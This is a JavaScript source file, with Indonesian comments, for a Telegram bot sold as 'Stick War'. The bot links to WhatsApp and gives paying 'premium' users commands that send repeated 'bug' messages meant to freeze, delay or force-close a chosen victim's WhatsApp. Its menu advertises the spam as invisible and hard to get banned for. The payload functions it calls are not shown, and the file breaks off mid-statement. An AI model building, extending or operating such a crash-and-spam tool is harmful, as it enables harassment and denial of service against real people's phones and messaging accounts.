const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@bellachu/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Memek/premiums.json";
const adminFile = "./Memek/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/2ikqgk.jpg",
"https://files.catbox.moe/2ikqgk.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

  const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/rezzxaay-byte/Database/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

console.log(chalk.bold.blue("Sedang Mengecek Database..."));


console.log("MEMVERIFIKASI.....");

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("TOKEN ANDA TIDAK TERDAFTAR DI DATA BASE MOHON UNTUK MEMBELI SCRIPT DI DIRESSLLER TERSEDIA!!!"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }
  console.log(chalk.green(`[!] From System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
  startBot();
}
  
  function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
███████╗████████╗██╗ ██████╗██╗  ██╗
██╔════╝╚══██╔══╝██║██╔════╝██║ ██╔╝
███████╗   ██║   ██║██║     █████╔╝ 
╚════██║   ██║   ██║██║     ██╔═██╗ 
███████║   ██║   ██║╚██████╗██║  ██╗
╚══════╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝

██╗    ██╗ █████╗ ██████╗ 
██║    ██║██╔══██╗██╔══██╗
██║ █╗ ██║███████║██████╔╝
██║███╗██║██╔══██║██╔══██╗
╚███╔███╔╝██║  ██║██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝
      `));
  console.log(
    chalk.bold.green(`
©STICK WAR ANTI AMPAS DECK
`));
}
   
validateToken();

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404343696075@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const mainMenuMessage = `<pre>━━━【sᴛɪᴄᴋ ᴡᴀʀ】━━━ 一緒
𝙃𝙖𝙡𝙤 𝘽𝙖𝙣𝙜 ${Name} 𝙨𝙚𝙡𝙖𝙢𝙖𝙩 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 "нαηтα'χ" 𝘽𝙚𝙧𝙗𝙞𝙟𝙖𝙠𝙡𝙖𝙝 𝙙𝙖𝙡𝙖𝙢 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣

    ✘𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞 sᴛɪᴄᴋ ᴡᴀʀ×‌×
    
➥ 所有者 : @GabreilRey
➥ バージョン : sᴛɪᴄᴋ ᴡᴀʀ    
➥ ランタイム : ${waktuRunPanel}
➥ あなたのID : Telegraf

ᝰ.ᐟ 𝑺𝒆𝒍𝒂𝒍𝒖 𝒃𝒂𝒄𝒂 𝒔𝒆𝒕𝒊𝒂𝒑 𝒊𝒏𝒇𝒐𝙧𝒎𝒂𝙨𝒊 𝒚𝒂𝒏𝒈 𝒅𝒊𝒃𝒆𝒓𝒊𝒌𝒂𝒏

×‌× ᴘᴇɴᴄᴇᴛ sᴀʟᴀʜ sᴀᴛᴜ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ sᴛɪᴄᴋ ᴡᴀʀ</pre>
`;

  const mainKeyboard = [
    [
      {
        text: ".☘️˖° Menu Bug",
        style: "danger", 
        callback_data: "bug_menu",
      },
      {
        text: "🜲Tools Menu",
        style: "success", 
        callback_data: "owner_menu"
      }
  ], 
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `
<pre>━━━【𝚂𝚃𝙸𝙲𝙺 𝚆𝙰𝚁】━━━
╭▄︻デʍɛռʊ ᴛᴏᴏʟs═══━一
┃    ツールメニュー
━━━【𝗦𝗲𝗻𝗱𝗲𝗿】━━━
┃╰┈➤ /addsender 62xx
┃ᝰ.ᐟ Tambah Sender Pairing
┃╰┈➤ /Status
┃ᝰ.ᐟ Cek Sender Online
┃╰┈➤ /delsesi 62xx
┃ᝰ.ᐟ Hapus Sender Pairing

━━━【𝗣𝗿𝗲𝗺𝗶𝘂𝗺】━━━
┃╰┈➤ /addprem id 1d/7d/30d
┃ᝰ.ᐟ Tambah User Premium
┃╰┈➤ /delprem id
┃ᝰ.ᐟ Hapus User Premium
┃╰┈➤ /cekprem
┃ᝰ.ᐟ Lihat Semua User Premium

━━━【𝗔𝗱𝗺𝗶𝗻】━━━
┃╰┈➤ /addadmin id
┃ᝰ.ᐟ Tambah Admin Bot
┃╰┈➤ /deladmin id
┃ᝰ.ᐟ Hapus Admin Bot

━━━【𝙊𝘁𝙝𝗲𝗿】━━━
┃╰┈➤ /brat
┃ᝰ.ᐟ Ubah Stiker (kayaknya) 
┃╰┈➤ /iqc
┃ᝰ.ᐟ Ga tau
┃╰┈➤ /tiktokdl
┃ᝰ.ᐟ Search Tik Tok
╰━━━━━━━━━━━━━━━༉‧.
</pre>`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
      {
        text: ".☘️˖° Menu Bug",
        style: "danger", 
        callback_data: "bug_menu",
      },
      {
        text: "🜲Tools Menu",
        style: "success", 
        callback_data: "owner_menu"
      }
  ], 
  [
   {
     text: "Kembali",
     style: "danger", 
     callback_data: "back"
   }
  ]
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
<pre>━━━【sᴛɪᴄᴋ ᴡᴀʀ】━━━
╭▄︻デʍɛռʊ ɮʊɢ═══━一
┃    バグメニュー
━━━【𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲】━━━
┃╰┈➤ /xyners ✆ 62xx
┃ᝰ.ᐟ DELAY BEBAS SPAM INVIS V1
┃╰┈➤ /vyners ✆ 62xx
┃ᝰ.ᐟ DELAY BEBAS SPAM INVIS V2 
┃╰┈➤ /xoyaaa ✆ 62xx
┃ᝰ.ᐟ DELAY PERMA SPAM V3
┃╰┈➤ /zyners ✆ 62xx
┃ᝰ.ᐟ DELAY BEBAS SPAM INVIS V4
┃╰┈➤ /Xforclose ✆ 62xx
┃ᝰ.ᐟ FORCLOSE CLICK
╰━━━━━━━━━━━━━━━༉‧.
━━━【𝗣𝗲𝗻𝘁𝗶𝗻𝗴!!】━━━
𝗡𝗯 : 𝘐𝘯𝘷𝘪𝘴𝘪𝘣𝘭𝘦 : 𝘛𝘪𝘥𝘢𝘬 𝘛𝘦𝘳𝘭𝘪𝘩𝘢𝘵
Semua Fitur Disetting Bebas Spam
Tidak Mudah Kena Banned 🔥</pre>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
      {
        text: ".☘️˖° Menu Bug",
        style: "danger", 
        callback_data: "bug_menu",
      },
      {
        text: "🜲Tools Menu",
        style: "success", 
        callback_data: "owner_menu"
      }
  ], 
  [
   {
     text: "Kembali",
     style: "danger", 
     callback_data: "back"
   }
  ]
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "Online"
      : "Offline"; 
      
  const mainMenuMessage = `
<pre>╭━━━【𝚂𝚃𝙸𝙲𝙺 𝚆𝙰𝚁】━━━
┃ᝰ.ᐟ 所有者  : @GabreilRey
┃ᝰ.ᐟ バージョン : ʙᴏᴛ sᴛɪᴄᴋ ᴡᴀʀ  
┃ᝰ.ᐟ ランタイム : ${waktuRunPanel}
╰⋆━━━━━━━━━━━━━━━━━━༉‧.
༺𓆩❟❛❟𓆪༻⋆sᴛɪᴄᴋ ᴡᴀʀ⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕤𝕚 )
┃ᝰ.ᐟ ユーザー : ${Name}
┃ᝰ.ᐟ ユーザー : ${waStatus}
╰━━━━━━━━━━━━━━━━━━༉‧.
༺𓆩❟❛❟𓆪༻⋆𝘚𝘛𝘐𝘊𝘒 𝘞𝘈𝘙⋆༺𓆩❟❛❟𓆪༻⋆
╭━( 𝕋𝕙𝕒𝕟𝕜𝕤 𝕋𝕠 )
┃ᝰ.ᐟ ᴀʟʟᴀʜ [ ᴍʏ ɢᴏᴅ ]
┃ᝰ.ᐟ GabreilRey [ ᴅᴇᴠ¹ ]
┃ᝰ.ᐟ fallxpn [ ʙᴇsᴛ ᴘʀᴇɴᴅ ]
┃ᝰ.ᐟ yateamlu [ ɪᴅᴏʟᴀ ]
┃ᝰ.ᐟ sᴇᴍᴜᴀ ᴘᴇᴍʙᴇʟɪ sᴄʀɪᴘᴛ
╰━━━━━━━━━━━━━━━༉‧.
</pre>`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: ".☘️˖° Menu Bug",
        style: "danger", 
        callback_data: "bug_menu",
      },
      {
        text: "🜲Tools Menu",
        style: "success", 
        callback_data: "owner_menu"
      }
  ], 
  [
   {
     text: "Kembali",
     style: "danger", 
     callback_data: "back"
   }
  ]
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

//////// -- CASE BUG 1 --- \\\\\\\\\\\
// Fitur: xvisible
bot.command("xyners", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xyners 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/05qp9m.jpg", {
    caption: `
<blockquote>交 𝘚𝘛𝘐𝘊𝘒 𝘞𝘈𝘙  ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xyners 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Send Bug CurseDelay ${i + 1}/5000 To ${q}`));
      await delayspam(sock, target);
      await sleep(3000);
    }
  })();
});
bot.command("Xforclose", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xyners 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/05qp9m.jpg", {
    caption: `
<blockquote>交 𝘚𝘛𝘐𝘊𝘒 𝘞𝘈𝘙  ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Xforclose 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 120; i++) {
      console.log(chalk.red(`Send Bug Forclose Click ${i + 1}/5000 To ${q}`));
      await NoctraFcklik(target);
      await sleep(300);
    }
  })();
});
bot.command("xoyaaa", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xoyaaa 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/05qp9m.jpg", {
    caption: `
<blockquote>交 𝘚𝘛𝘐𝘊𝘒 𝘞𝘈𝘙 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xoyaaa 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 200; i++) {
      console.log(chalk.red(`Send Bug CurseDelay ${i + 1}/5000 To ${q}`));
      await DelayBuldoHardFreezeByMia(sock, target);
      await sleep(700);
    }
  })();
});
bot.command("vyners", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /vyners 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/05qp9m.jpg", {
    caption: `
<blockquote>交 𝘚𝘛𝘐𝘊𝘒 𝘞𝘈𝘙 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /vyners 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug Delay ${i + 1}/30 To ${q}`));
      await DelayBuldoHardFreezeByMia(sock, target);
      await sleep(2000);
    }
  })();
});
bot.command("zyners", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /zyners 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/05qp9m.jpg", {
    caption: `
<blockquote>交 𝘚𝘛𝘐𝘊𝘒 𝘞𝘈𝘙 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /zyners 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      console.log(chalk.red(`Send Bug CurseDelay ${i + 1}/5000 To ${q}`));
      await delayspam(sock, target);
      await sleep(1000);
    }
  })();
});
// Kumpulan Tools Hama
// TOOLS IQC
bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|xavionerAmpazz",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
// TOOLS BRAT
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
// TOOLS TIKTOK DOWNLOAD
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "WLKRSTRK");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗛𝗮𝗽𝘂𝘀", callback_data: "Close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
// Handler untuk tombol close
bot.action("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
